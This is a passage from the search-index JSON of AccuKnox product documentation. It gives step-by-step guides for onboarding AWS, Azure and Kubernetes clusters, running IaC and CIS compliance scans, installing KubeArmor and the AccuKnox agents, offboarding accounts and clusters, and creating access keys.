regulatory requirements.</p>"},{"location":"how-to/aiml-overview/#supported-platforms-and-use-cases","title":"Supported Platforms and Use Cases","text":"<p>Useful Links</p> <ul> <li>For list of supported platforms refer to AccuKnox's AI/ML Support Matrix</li> <li>For use cases refer to the AI/ML Security Use Cases</li> </ul>"},{"location":"how-to/aiml-overview/#onboarding-aiml-assets-from-cloud-providers","title":"Onboarding AI/ML Assets from Cloud Providers","text":"<p>Pick your cloud provider to get started with onboarding AI/ML assets:</p> <p>AWS</p> <p>Azure</p> <p>GCP</p> <p></p>"},{"location":"how-to/aiml-overview/#featured-videos","title":"Featured Videos","text":"AI Copilot        <p>Enhance security operations with AI-driven insights, automated threat detection, and response recommendations.</p>          AI Compliance        <p>Automate policy checks and ensure AI systems align with standards like EU AI Act, NIST, and ISO 42001.</p>          Model Safety        <p>Safeguard models from misuse and ensure responsible AI behavior through explainability and guardrails.</p>          Securing AI Factories        <p>Implement end-to-end security for AI pipelines\u2014from data ingestion to model deployment.</p>"},{"location":"how-to/aspm-overview/","title":"ASPM Overview","text":""},{"location":"how-to/aspm-overview/#how-application-security-posture-management-works","title":"How Application Security Posture Management Works?","text":"<p>ASPM leverages a range of security tools, such as:</p> <ul> <li> <p>SAST (Static Application Security Testing)</p> </li> <li> <p>DAST (Dynamic Application Security Testing)</p> </li> <li> <p>SCA (Software Composition Analysis)</p> </li> <li> <p>IaC (Infrastructure as Code) scanning</p> </li> <li> <p>Secret scanning tools</p> </li> </ul> <p>These tools are integrated at various stages of the DevOps lifecycle, ensuring comprehensive security coverage. The diagram above illustrates how ASPM aligns with the different phases of CI/CD to deliver continuous application security.</p> <p>For more details on incorporating security into the DevOps lifecycle, visit the DevSecOps page.</p>"},{"location":"how-to/aspm-overview/#use-cases","title":"Use Cases","text":"<p>Container Scanning</p> <p>SAST</p> <p>Vulnerability Management</p> <p>DAST (MFA-Enabled)</p> <p>DAST XSS Mitigation</p> <p>Secret Scan in CI/CD</p> <p>Secrets in Code Repositories</p> <p>Secrets in S3 Buckets &amp; File Systems</p> <p>Rules Engine &amp; Automated Ticket Creation</p> <p>EPSS Scoring for Prioritization</p> <p>SCA</p> <p>Secrets in Container Images</p> <p>Secrets in Kubernetes ConfigMaps</p> <p>IaC Security</p>"},{"location":"how-to/aspm-overview/#integrating-accuknox-aspm","title":"Integrating AccuKnox ASPM","text":"<p>AccuKnox ASPM supports integration with popular CI/CD platforms, such as:</p> <ul> <li> <p>Azure DevOps</p> </li> <li> <p>GitHub Actions</p> </li> <li> <p>GitLab CI/CD</p> </li> <li> <p>And many others.</p> </li> </ul> <p>AccuKnox offers plugins for various CI/CD platforms, which can be found in the CI/CD support matrix page. To integrate AccuKnox ASPM with your specific CI/CD platform, refer to the CI/CD Integrations page for step-by-step guidance.</p> <p>By integrating AccuKnox ASPM, organizations can ensure their CI/CD pipelines are fortified with cutting-edge application security tools, reducing vulnerabilities and improving overall software quality.</p>"},{"location":"how-to/aws-cdk-iac-scan/","title":"AWS CDK Scan with AccuKnox","text":""},{"location":"how-to/aws-cdk-iac-scan/#overview","title":"Overview","text":"<p>This document provides a step-by-step guide on scanning AWS CDK projects using the AccuKnox platform. The process involves generating the template using AWS CDK, pushing the code to GitHub, configuring AccuKnox for scanning, and reviewing security findings.</p>"},{"location":"how-to/aws-cdk-iac-scan/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS CDK installed  </li> <li>A GitHub repository  </li> <li>An active AccuKnox account  </li> </ul>"},{"location":"how-to/aws-cdk-iac-scan/#installing-aws-cdk-skip-if-already-installed","title":"Installing AWS CDK (Skip if already installed)","text":"<p>To install AWS CDK, run the following command:</p> <p><pre><code>npm install -g aws-cdk\n</code></pre> Verify the installation:</p> <p><pre><code>cdk --version\n</code></pre> This command should return the installed version of AWS CDK.     </p>"},{"location":"how-to/aws-cdk-iac-scan/#steps","title":"Steps","text":""},{"location":"how-to/aws-cdk-iac-scan/#1-navigate-to-your-cdk-folder-path","title":"1. Navigate to Your CDK Folder Path","text":"<p>Ensure you are in the directory where your AWS CDK project is located.</p>"},{"location":"how-to/aws-cdk-iac-scan/#2-generate-the-cloudformation-template","title":"2. Generate the CloudFormation Template","text":""},{"location":"how-to/aws-cdk-iac-scan/#what-is-cdk-synth","title":"What is <code>cdk synth</code>?","text":"<p>The <code>cdk synth</code> command synthesizes the AWS CloudFormation template from your AWS CDK application, generating a YAML file that represents the defined infrastructure.</p> <p>Run the following command:</p> <p><pre><code>cdk synth &gt; synth_output.yaml\n</code></pre> </p>"},{"location":"how-to/aws-cdk-iac-scan/#3-confirm-the-yaml-file-is-generated","title":"3. Confirm the YAML File is Generated","text":"<p>Verify that synth_output.yaml is created in the project directory.     </p>"},{"location":"how-to/aws-cdk-iac-scan/#4-push-code-to-github","title":"4. Push Code to GitHub","text":"<p>Follow these steps to push your code:</p> <p><pre><code>git add .\ngit commit -m \"Added synthesized CloudFormation template\"\ngit push origin main\n</code></pre>  Ensure your repository is linked to GitHub before executing these commands.</p>"},{"location":"how-to/aws-cdk-iac-scan/#5-log-in-to-accuknox","title":"5. Log in to AccuKnox","text":"<p>Navigate to AccuKnox and log in with your credentials.</p>"},{"location":"how-to/aws-cdk-iac-scan/#6-configure-code-scan","title":"6. Configure Code Scan","text":"<ol> <li>Go to Settings \u2192 Integrations </li> <li>Under Code Scan Configuration, click Add Configuration </li> <li>Fill in the required details </li> </ol>"},{"location":"how-to/aws-cdk-iac-scan/#7-configure-iac-scan","title":"7. Configure IaC Scan","text":"<ol> <li>Go to IaC Configuration </li> <li>Click Add Configuration </li> <li>Enter Integration Name </li> <li>Set Framework as CloudFormation </li> <li>Select the Repository from the dropdown  </li> <li> <p>In Conditions, set Include pattern:</p> <p><pre><code>.*/synth_output\\.yaml$\n</code></pre> This ensures that only <code>synth_output.yaml</code> is scanned.  7. Click Save.</p> </li> </ol>"},{"location":"how-to/aws-cdk-iac-scan/#8-view-findings","title":"8. View Findings","text":"<ol> <li>Navigate to Findings under the Issues tab  </li> <li>Select Finding Type as IaC Findings </li> <li>View all security findings in your source code </li> </ol>"},{"location":"how-to/aws-cdk-iac-scan/#conclusion","title":"Conclusion","text":"<p>Following these steps, you can successfully scan AWS CDK-generated CloudFormation templates using the AccuKnox platform. This process ensures that your infrastructure-as-code adheres to security best practices before deployment.</p> <p>For further assistance, reach out to support@accuknox.com.</p>"},{"location":"how-to/aws-onboarding/","title":"AWS Account onboarding","text":"<p>In this section we can find the steps to onboard an AWS cloud account to the AccuKnox SaaS platform.</p> <p></p>"},{"location":"how-to/aws-onboarding/#aws-iam-user-creation","title":"AWS IAM User Creation","text":"<p>Please follow the following steps to provide a user with appropriate read access:</p> <p>Step 1: Navigate to IAM \u2192 Users and click on Add Users</p> <p></p> <p>Step 2: Give a username to identify the user</p> <p></p> <p>Step 3: In the \"Set Permissions\" screen:</p> <p>a. Select \"Attach policies directly\"</p> <p>b. Search \"ReadOnly\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>c. Search \"SecurityAudit\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>Step 4: Finish creating the user. Click on the newly created user and create the Access key and Secret Key from the Security Credentials tab to be used in the AccuKnox panel</p> <p></p>"},{"location":"how-to/aws-onboarding/#aws-onboarding","title":"AWS Onboarding","text":"<p>In this example we are onboarding AWS account using the Access Keys method.</p> <p>Step 1: To onboard Cloud Account Navigate to Settings\u2192cloud Accounts</p> <p></p> <p>Step 2: In the Cloud Account Page select Add Account option</p> <p></p> <p>Step 3: Select the AWS option</p> <p></p> <p>Step 4: In the next Screen select the labels and Tags field from the dropdown Menu.</p> <p></p> <p>Step 5: After giving labels and Tag in the Next Screen Provide the AWS account\u2019s Access Key and Secret Access Key ID and Select the Region of the AWS account.</p> <p></p> <p>Step 6: AWS account is added to the AccuKnox using Access Key Method. We can see the onboarded cloud account by navigating to Settings\u2192cloud Accounts option.</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/aws-org-onboard/","title":"Onboarding AWS Organization Accounts to AccuKnox","text":"<p>Managing security across multiple AWS accounts is complex. AWS Organizations simplifies this by grouping accounts under one structure. AccuKnox enhances this by enabling organization-level onboarding\u2014removing the need to add accounts individually. This ensures centralized visibility, consistent policy enforcement, and automatic coverage for new accounts.</p> <p>This guide explains how to onboard your AWS Organization root account to AccuKnox.</p> <p></p> <p></p>"},{"location":"how-to/aws-org-onboard/#prerequisites","title":"Prerequisites","text":"<ul> <li>You must have administrative access to your AWS Management Account and have permissions to deploy CloudFormation StackSet across the Organization.</li> <li>You need the AWS Organization ID of your root organization.</li> <li>Enable all features in AWS Organizations:   You must enable all features in your AWS Organization. If only consolidated billing is enabled, you won\u2019t be able to create StackSets with service-managed permissions.Ref: Enable All Features \u2013 AWS Documentation</li> <li>Trusted Access must be activated for AWS CloudFormation StackSets (ref link):<ul> <li>Sign in as an administrator to the AWS Management Account.</li> <li>Open the CloudFormation console.</li> <li>From the navigation pane, choose StackSets.</li> <li>If trusted access is not enabled, a banner will appear \u2014 click Activate trusted access.   </li> <li>Once enabled, you will see a confirmation banner: \u201cTrusted access is successfully activated.\u201d </li> </ul> </li> </ul>"},{"location":"how-to/aws-org-onboard/#step-by-step-onboarding-process","title":"Step-by-Step Onboarding Process","text":"<p>Follow these steps to connect your AWS Organization to AccuKnox:</p>"},{"location":"how-to/aws-org-onboard/#1-initiate-account-onboarding","title":"1. Initiate Account Onboarding","text":"<p>In the AccuKnox platform, navigate to Cloud Security \u2192 Cloud Accounts from the left-hand navigation menu. Select the Organization button, and then select Onboard Account.</p> <p></p>"},{"location":"how-to/aws-org-onboard/#2-configure-organization-account-type-and-labels","title":"2. Configure Organization Account Type and Labels","text":"<p>Select Organization Account as the account type.</p> <p></p> <p>Next, select existing labels or create new ones to associate with all assets that will be discovered within this AWS Organization.</p>"},{"location":"how-to/aws-org-onboard/#3-choose-account-filter-type-includeexclude","title":"3. Choose Account Filter Type (INCLUDE/EXCLUDE)","text":"<p>You can now control which AWS accounts within your Organization are onboarded using the Account Filter Type option:</p> <ul> <li>INCLUDE: Only the accounts you specify will be onboarded.</li> <li>EXCLUDE: All accounts except those you specify will be onboarded.</li> <li>NONE (default): All accounts in the Organization will be onboarded.</li> </ul> <p>Select the desired filter type and enter the list of AWS Account IDs as needed. If you do not specify a filter, all accounts will be included by default.</p> <p></p>"},{"location":"how-to/aws-org-onboard/#4-enter-aws-organization-details","title":"4. Enter AWS Organization Details","text":"<ul> <li>Log in to the AWS Console \u2192 go to AWS Organizations.</li> <li> <p>Copy your Organization ID (e.g., <code>r-xxxxxxxxxx</code>).   </p> </li> <li> <p>You must use the root organization account.</p> </li> <li>In AccuKnox, paste the ID into the AWS Organization ID field.</li> <li>Select the AWS regions where your assets are located.   </li> </ul> <p>Note</p> <p>At present, all assets discovered under this organization will inherit these selected labels. Granular labeling for individual assets will be an enhancement in future updates.</p>"},{"location":"how-to/aws-org-onboard/#5-enable-auto-connect-launch-stackset","title":"5. Enable Auto-Connect &amp; Launch StackSet","text":"<ul> <li>Toggle Automatically connect to new accounts (optional).</li> <li>Click Launch CloudFormation StackSet to open the AWS Console.</li> </ul>"},{"location":"how-to/aws-org-onboard/#6-create-the-stack-in-aws","title":"6. Create the Stack in AWS","text":"<ul> <li>Scroll down, check the box:   \"I acknowledge that AWS CloudFormation might create IAM resources...\"</li> <li>Click Create stack.</li> </ul>"},{"location":"how-to/aws-org-onboard/#7-wait-for-stackset-deployment","title":"7. Wait for StackSet Deployment","text":"<ul> <li>Wait until the status shows CREATE_COMPLETE.</li> </ul>"},{"location":"how-to/aws-org-onboard/#8-copy-role-arn","title":"8. Copy Role ARN","text":"<ul> <li>Go to the Outputs tab of the StackSet.</li> <li>Copy the value of <code>RoleArnInManagementAccount</code>.</li> </ul>"},{"location":"how-to/aws-org-onboard/#9-connect-in-accuknox","title":"9. Connect in AccuKnox","text":"<ul> <li>Paste the ARN in the Role ARN field.</li> <li>Click Connect.</li> </ul>"},{"location":"how-to/aws-org-onboard/#10-confirm-onboarding","title":"10. Confirm Onboarding","text":"<ul> <li>You\u2019ll be redirected to the Cloud Accounts page.</li> <li>Refresh the page to see your AWS Organization listed.</li> </ul>"},{"location":"how-to/aws-org-onboard/#post-onboarding","title":"Post-Onboarding","text":"<p>Once your AWS Organization is successfully onboarded:</p> <ul> <li> <p>Asset Discovery:   AccuKnox will start an inventory discovery process across all member accounts in the selected regions.</p> </li> <li> <p>Security Scans:   Automated security scans will be scheduled to assess your cloud resources for misconfigurations, vulnerabilities, and compliance violations.</p> </li> <li> <p>Dashboard Population:   Data will begin to populate your AccuKnox dashboards, providing insights into your organization's security posture.   This may take some time depending on the size and complexity of your AWS environment.</p> </li> </ul> <p>You have now successfully onboarded your AWS Organization to AccuKnox, enabling comprehensive, centralized cloud security management.</p>"},{"location":"how-to/azure-onboarding/","title":"Azure Account onboarding","text":"<p>In this section we can find the steps to onboard an Azure cloud account to the AccuKnox SaaS platform</p>"},{"location":"how-to/azure-onboarding/#rapid-onboarding-via-azure","title":"Rapid Onboarding (via Azure)","text":"<p>For Azure Onboarding it is required to register an App and giving Security read access to that App from the Azure portal.</p> <p>Step 1: Go to your Azure Portal and search for App registrations and open it</p> <p></p> <p>Step 2: Here click on New registration</p> <p></p> <p>Step 3: Give your application a name, remember this name as it will be used again later, For the rest keep the default settings</p> <p></p> <p>Step 4: Now your application is created,  save Application ID and Directory ID as they will be needed to for onboarding on AccuKnox Saas and then click on \u2018Add a certificate or secret\u2019</p> <p></p> <p>Step 5: Click on new client secret and enter the name and expiration date to get secret id and secret value, save this secret value as this will also be needed for onboarding.</p> <p></p> <p>Step 6: Next, go to API permissions tab and click on 'Add  permission'</p> <p></p> <p>Step 7: On the screen that appears, click on 'Microsoft Graph'</p> <p></p> <p>Step 8: Next, select Application Permissions and then search for Directory.Read.All and click on Add permissions</p> <p></p> <p>Step 9: Select \u2018Grant Admin Consent\u2019 for Default Directory and click on \u2018Yes\u2019</p> <p></p> <p>Step 10: Now we need to give Security read permissions to this registered Application , to do that go to subscriptions</p> <p></p> <p>Step 11: First save the subscription ID and click on the subscription name , here it is \u201cMicrosoft Azure Sponsorship\u201c</p> <p></p> <p>Step 12: Navigate to Access control(IAM) and go to Roles , here select Add and Add role assignment</p> <p></p> <p>Step 13: Search for \u201cSecurity Reader\u201d Job function Role, select it and press next</p> <p></p> <p>Step 14: In the member section click on Select members it will open a dropdown menu on the right hand side</p> <p></p> <p>Step 15: Here search for the Application that you registered in the beginning , select the application and click on review and assign.</p> <p></p> <p>Step 16: Similarly, we have to add another role. This time, search for Log Analytics Reader. Select it and click next</p> <p></p> <p>Step 17: Now, click on Select members, select the application that was created similar to the previous role. Finally, click on Review and Assign.</p> <p></p>"},{"location":"how-to/azure-onboarding/#from-accuknox-saas-ui","title":"From AccuKnox SaaS UI","text":"<p>Configuring your Azure cloud account is complete, now we need to onboard the cloud account onto AccuKnox Saas Platform.</p> <p>Step 1: Go to settings\u2192 Cloud Account and click on Add Account</p> <p></p> <p>Step 2: Select Microsoft Azure as Cloud Account Type</p> <p></p> <p>Step 3: Select or create label and Tags that will be associated with this Cloud Account</p> <p></p> <p>Step 4: Enter the details that we saved earlier during the steps for app registration and subscription id from subscriptions in azure portal and click on connect</p> <p></p> <p>Step 5: After successfully connecting your cloud account will show up in the list</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/cis-benchmarking/","title":"CIS Benchmarking Compliance Scan Onboarding","text":"<p>This guide details the steps to onboard a Kubernetes cluster to Accuknox SaaS for CIS Benchmarking compliance scanning, enabling you to monitor and improve cluster security in line with CIS standards.</p>"},{"location":"how-to/cis-benchmarking/#step-1-generate-an-access-token","title":"Step 1: Generate an Access Token","text":"<p>To begin, create a token that will authenticate your cluster for scanning. Follow these steps:</p> <ol> <li> <p>Navigate to Settings &gt; Tokens in the Accuknox platform and Click on the Create button, give your token a descriptive name (e.g., \"CIS-Compliance-Token\"), and click Generate. </p> </li> <li> <p>Once the token is generated, copy it and securely save it for later use. </p> </li> </ol>"},{"location":"how-to/cis-benchmarking/#step-2-onboard-your-cluster","title":"Step 2: Onboard Your Cluster","text":"<ol> <li> <p>Go to Settings &gt; Manage Clusters and Click Onboard Now or select an existing cluster if you're updating a previously onboarded cluster. </p> </li> <li> <p>Enter a name for your cluster to identify it in Accuknox. From the scan type, choose CIS Benchmarking.</p> </li> <li> <p>Select a label for easy identification and paste the token you generated in Step 1. Set a scan schedule based on your requirements. Accuknox will automatically run scans according to the selected schedule. </p> </li> </ol>"},{"location":"how-to/cis-benchmarking/#step-3-deploy-the-scanner-using-helm","title":"Step 3: Deploy the Scanner Using Helm","text":"<ol> <li> <p>Scroll down to the Helm Command section and copy the provided command. </p> </li> <li> <p>Run this command in your terminal on a machine that has access to your Kubernetes cluster. The command will schedule the scan for CIS Benchmarking compliance.</p> </li> <li> <p>Once the Helm installation is complete, return to the Accuknox platform and click Finish.</p> </li> </ol>"},{"location":"how-to/cis-benchmarking/#step-4-view-compliance-findings","title":"Step 4: View Compliance Findings","text":"<p>After the initial scan is completed, you can view the compliance results:</p> <ol> <li> <p>Go to Issues &gt; Findings in Accuknox.</p> </li> <li> <p>Use the Findings dropdown to filter and select CIS k8s Benchmarking finding results. </p> </li> <li> <p>Each result will provide details on specific CIS controls and any non-compliant configurations detected. </p> </li> </ol> <p></p> <p>This completes the onboarding process for CIS Benchmarking compliance scanning. You can review findings regularly to maintain and improve your cluster's CIS compliance.</p>"},{"location":"how-to/cloud-offboarding/","title":"How to Deboard a Cloud Account","text":"<p>This guide outlines the steps for offboarding a cloud account from AccuKnox SaaS.</p> <p>Step 1: Login to AccuKnox SaaS and Go to Cloud Accounts under Settings. </p> <p>Step 2: Select the cloud account and click \u201cDelete\u201d to delete the account from SaaS. </p> <p>This will delete the cloud account from AccuKnox SaaS.</p>"},{"location":"how-to/cluster-misconfig-scan-onboarding/","title":"Onboard Cluster for Misconfiguration Scanning","text":"<p>This guide outlines the steps for onboarding a cluster to AccuKnox SaaS for scanning cluster misconfigurations.</p> <p>For onboarding a cluster and for scanning for misconfigurations you need to create a token first. For creating follow these steps:</p> <p>Go to <code>Settings &gt; Tokens</code> and click on the create button. Give your token a name and click on generate button.</p> <p></p> <p>Once the token is generated, copy it and take a note of it.</p> <p></p> <p>Now go to <code>Settings &gt; Manage Clusters</code>, click on onboard now button or select an existing cluster.</p> <p></p> <p>Give your cluster a name. Under the Agents Installation section select Cluster Misconfiguration. Select a label and paste your token.</p> <p></p> <p>You can also change the schedule as per your requirement. Then next scan will happen based on the schedule. Scroll down and copy the helm command and run it inside a terminal. Then click on Finish button.</p> <p></p> <p>Once the scan is completed you can see the results on the findings page.</p> <ol> <li> <p>Go to the <code>Issues &gt; Findings</code> page.</p> </li> <li> <p>Select the Cluster Finding from the drop down.</p> </li> </ol> <p></p> <p>Click on any of the findings to see more details.</p> <p></p> <p></p>"},{"location":"how-to/cluster-offboarding/","title":"Cluster Offboarding","text":"<p>This guide outlines the steps for offboarding a cluster from AccuKnox SaaS. The process involves uninstalling the agents from the cluster and deleting the cluster from AccuKnox SaaS.</p> <p>Below, you will find detailed instructions for agent uninstallation from your cluster CLI and deleting the cluster from AccuKnox SaaS. These steps apply to all clusters.</p>"},{"location":"how-to/cluster-offboarding/#agents-uninstallation","title":"Agents Uninstallation","text":"<p>Uninstall AccuKnox agents using the following commands:</p> <pre><code>helm uninstall agents -n agents &amp;&amp; kubectl delete ns agents;\n\nhelm uninstall cis-k8s-job;\n\nhelm uninstall kiem-job;\n\nhelm uninstall k8s-risk-assessment-job\n</code></pre>"},{"location":"how-to/cluster-offboarding/#sample-for-uninstalling-runtime-visibility-protection-agents","title":"Sample for Uninstalling Runtime Visibility &amp; Protection agents","text":"<pre><code>\u00a0(Accuknox\u327fkali)-[~]\n\n\u2514\u2500$ helm uninstall agents -n agents &amp;&amp; kubectl delete ns agents\n\nWARNING: Kubernetes configuration file is group-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml\n\nWARNING: Kubernetes configuration file is world-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml\n\nrelease \"agents\" uninstalled\n\nnamespace \"agents\" deleted\n</code></pre>"},{"location":"how-to/cluster-offboarding/#cluster-deletion","title":"Cluster Deletion","text":"<p>Step 1:\u00a0Login to AccuKnox SaaS and Go to Manage Cluster under Settings</p> <p></p> <p>Step 2:\u00a0Select the cluster and click Delete to delete the cluster from SaaS.</p> <p></p> <p>This will delete the cluster from AccuKnox SaaS.</p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/cluster-onboarding-access-keys/","title":"Cluster Onboarding with Access Keys","text":"<p>Streamlining cluster onboarding is made easy with access keys, allowing users to onboard multiple clusters using the same key. Additionally, users can set expiration times for these keys and specify the number of clusters each key can onboard. This process can be performed directly from the CLI if the access key is already created, offering enhanced flexibility and convenience</p> <p>Pre-requisite:</p> <ol> <li> <p>Kubernetes (managed/un-manager) cluster</p> </li> <li> <p>AccuKnox CNAPP login access</p> </li> <li> <p>One or more clusters to onboard</p> </li> <li> <p>Access Key (See how to create)</p> </li> </ol>"},{"location":"how-to/cluster-onboarding-access-keys/#onboarding","title":"Onboarding","text":"<p>In the case of the Access key onboarding method, the User can directly onboard the VMs from the CLI, To Onboard a new cluster follow the below steps:</p>"},{"location":"how-to/cluster-onboarding-access-keys/#step1-install-kubearmor","title":"Step1: Install KubeArmor","text":"<pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\nkarmor install\n</code></pre> <p>Output:</p> <pre><code>kubearmor/kubearmor-client info checking GitHub for latest tag\nkubearmor/kubearmor-client info found version: 1.3.0 for v1.3.0/linux/amd64\nkubearmor/kubearmor-client info installed /usr/local/bin/karmor\nkubearmor/kubearmor-client info karmor is installed in /usr/local/bin\nkubearmor/kubearmor-client info invoke /usr/local/bin/karmor or move karmor to your desired PATH\n\n$ karmor install\n\ud83d\udee1       Installed helm release : kubearmor-operator\n\ud83d\ude04      KubeArmorConfig created\n\u231a\ufe0f     This may take a couple of minutes\n\ud83e\udd73      KubeArmor Snitch Deployed!\n\ud83e\udd73      KubeArmor Daemonset Deployed!\n\ud83e\udd73      Done Checking , ALL Services are running!\n\u231a\ufe0f     Execution Time : 58.615464051s\n\n\ud83d\udd27      Verifying KubeArmor functionality (this may take upto a minute)...\n\n        \ud83d\udee1\ufe0f      Your Cluster is Armored Up!\n</code></pre>"},{"location":"how-to/cluster-onboarding-access-keys/#step2-install-accuknox-agents","title":"Step2: Install AccuKnox Agents","text":"<p>AccuKnox-Agents:</p> <p>The AccuKnox Agent is a K8s operator that installs the following agents:</p> <ul> <li> <p>Feeder service: It collects KubeArmor feeds.</p> </li> <li> <p>Shared-informer-agent: This agent authenticates with your cluster and collects information regarding entities like nodes, pods, and namespaces.</p> </li> <li> <p>Policy-enforcement-agent: This agent authenticates with your cluster and enforces labels and policies.</p> </li> <li> <p>Discovery Engine: Discovery Engine discovers the security posture for your workloads and auto-discovers the policy set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor to auto-discover systems and network security postures.</p> </li> </ul> <p>The agent-operator also manages the agents' resource limits. The operator is in charge of spawning the agents based on the size of the cluster. If the cluster size changes, i.e., new nodes are added or existing nodes are deleted, then the operator scales up or down the resources accordingly.</p> <p>AccuKnox Agents can be installed using the following command:</p> <pre><code>helm upgrade --install agents oci://registry-1.docker.io/accuknox/accuknox-agents \\\n        --version \"v0.5.11\" \\\n        --set spireHost=\"spire.demo.accuknox.com\" \\\n        --set ppsHost=\"pps.demo.accuknox.com\" \\\n        --set knoxGateway=\"knox-gw.demo.accuknox.com:3000\" \\\n        --set tokenURL=\"cwpp.demo.accuknox.com\" \\\n        --set clusterName=\"accuknoxcluster\" \\\n        --set accessKey=\"&lt;token&gt;\" \\\n        -n accuknox-agents --create-namespace\n</code></pre> <p>Note</p> <p>In the commands above, substitute --set clusterName with the desired cluster name, and replace the <code>&lt;token&gt;</code> with the Access Keys generated from UI. Adjust the URLs if required</p> <p>Note</p> <p>Please check for the value of --version \"v0.0.0\" from the UI steps of cluster onboarding to make sure you are using the latest image tags</p>"},{"location":"how-to/cluster-onboarding-access-keys/#output","title":"Output","text":"<pre><code>Release \"agents\" does not exist. Installing it now.\nPulled: registry-1.docker.io/accuknox/accuknox-agents:v0.5.11\nDigest: sha256:6b7870020c0470741b7a89f47fd6f4e85882521721ce50407351d231508c6aaf\nNAME: agents\nLAST DEPLOYED: Thu Jan  2 19:05:38 2025\nNAMESPACE: accuknox-agents\nSTATUS: deployed\nREVISION: 1\nTEST SUITE: None\n</code></pre> <p>To verify please use</p> <pre><code>kubectl get po -n accuknox-agents\n</code></pre> <p>After installing all the AccuKnox agents, the cluster is onboarded successfully into the SaaS application. We can see the workload details of the onboarded cluster by Navigating to Inventory-&gt; Clusters</p> <p></p>"},{"location":"how-to/cluster-onboarding-access-keys/#view-the-workloads","title":"View the workloads","text":"<p>Note</p> <p>You can repeat the same command with different \"clusterName\" to onboard multiple cluster using access keys</p>"},{"location":"how-to/cluster-onboarding/","title":"Cluster Onboarding","text":"<p>This is a detailed guide on how to onboard clusters to the AccuKnox SaaS platform. The guide covers the installation of KubeArmor and AccuKnox agents in the cluster to connect to the AccuKnox SaaS application.</p> <p>Below shown image is from an k3s cluster running in a local machine with Kali Linux Operating System. We can onboard this cluster by following the steps shown below</p> <p></p> <p>Step 1:\u00a0As a first time user, the management console will show up the CNAPP dashboard without any data mentioned in widgets, since the cloud account and cluster onboarding is not done.</p> <p></p> <p>Step 2:\u00a0Navigate to Manage Cluster from Settings Tab: From this page we can onboard the clusters running in various cloud platforms like GCP,AWS and Azure. We can onboard locally setup clusters using an cloud option. To onboard cluster select\u00a0onboard now\u00a0option</p> <p></p> <p>Step 3:\u00a0In this screen, give any name to the cluster that you are going to onboard now.</p> <p></p> <p>Step 4:\u00a0Installing KubeArmor and AccuKnox agents</p> <p>We are going to install KubeArmor and AccuKnox-agents to connect to the AccuKnox SaaS application. For the agent installation selection click on the\u00a0Runtime Visibility &amp; Protection.</p> <p>Step 4.1 KubeArmor Installation</p> <p>KubeArmor</p> <p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level.</p> <p>With KubeArmor, a user can:</p> <ul> <li>Restrict file system access for certain processes</li> <li>Restrict what processes can be spawned within the pod</li> <li>Restrict the capabilities that can be used by the processes within the pod</li> </ul> <p>KubeArmor differs from seccomp-based profiles, wherein KubeArmor allows to dynamically set the restrictions on the pod. With seccomp, the restrictions must be placed during the pod startup and cannot be changed later. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.</p> <p></p> <p>KubeArmor is installed using the following commands:</p> <pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin &amp;&amp; karmor install\n</code></pre> <p>Step 4.2:\u00a0AccuKnox-Agents installation</p> <p>After installing KubeArmor we are going to install AccuKnox Agents in the cluster.</p>"},{"location":"how-to/cluster-onboarding/#accuknox-agents","title":"AccuKnox Agents","text":"<ol> <li>KubeArmor:\u00a0KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. KubeArmor dynamically set the restrictions on the pod. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.</li> <li>Feeder Service:\u00a0It collects the feeds from kubeArmor and relays to the app.</li> <li>Shared Informer Agent:\u00a0It collects information about the cluster like pods, nodes, namespaces etc.,</li> <li>Policy Discovery Engine:\u00a0It discovers the policies using the workload and cluster information that is relayed by a shared informer Agent.</li> </ol> <p>AccuKnox Agents can be installed using the following command:</p> <pre><code>helm upgrade --install agents oci://registry-1.docker.io/accuknox/accuknox-agents\n--version \"v0.6.5\"\n--set joinToken=\"***********-***********-***********\"\n--set spireHost=\"spire.demo.accuknox.com\"\n--set ppsHost=\"pps.demo.accuknox.com\"\n--set knoxGateway=\"knox-gw.demo.accuknox.com:3000\"\n-n agents --create-namespace\n</code></pre> <p>Note</p> <p>In the above command\u00a0joinToken\u00a0is specific to this example and it will vary based on the cluster</p> <p>Step 5:\u00a0Onboarded Cluster</p> <p>After installing all the AccuKnox agents the cluster is onboarded successfully into the SaaS application. We can see the workload details of the onboarded cluster by Navigating to Inventory\u2192cloud Workloads option. There all the onboarded clusters will be listed out and all the inactive ones would be grayed out. By Double clicking on the active cluster user can get a more detailed view of the cluster.</p> <p></p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/create-access-keys/","title":"How to Create Access Keys","text":"<p>This guide on how to create an access key in the AccuKnox SaaS platform helps you to authenticate and authorize your resources securely. Access Keys are used to authenticate and authorize the users to access the AccuKnox SaaS platform. You can create access keys for different users and manage them effectively.</p> <p>Warning</p> <p>Access Keys\u00a0are authentication credentials used to securely interact with various services and systems. They are crucial for operations such as querying information on CSPM, CWPP, and ASPM, Automating workflows from CLI, and Managing bundle operations from CLI.</p> <p>Access keys are created for users and carry the same permissions as the user who created them. If an administrator creates an access key, they can perform nearly any operation in the CNAPP directly from the CLI, which can be critical. Users must ensure that these access keys are kept private and secure and should never share them to avoid potential damage.</p> <p>Step 1:\u00a0Go to\u00a0Settings\u00a0and then select\u00a0User-Management </p> <p>Step 2:\u00a0On the User Management page, click\u00a0three vertical dots as shown in the below image. </p> <p>Step 3: Click on Get Access Key </p> <p>Step 4: In the input field, enter the name, select the expiration time, assign a role, and input the maximum number of clusters to be onboarded using the access key. Click on Generate </p> <p>Step 5: Copy the access key and store it securely to perform different operations on CNAPP </p>"},{"location":"how-to/cspm-prereq-aws/","title":"Pre-requisite for AWS Cloud Account 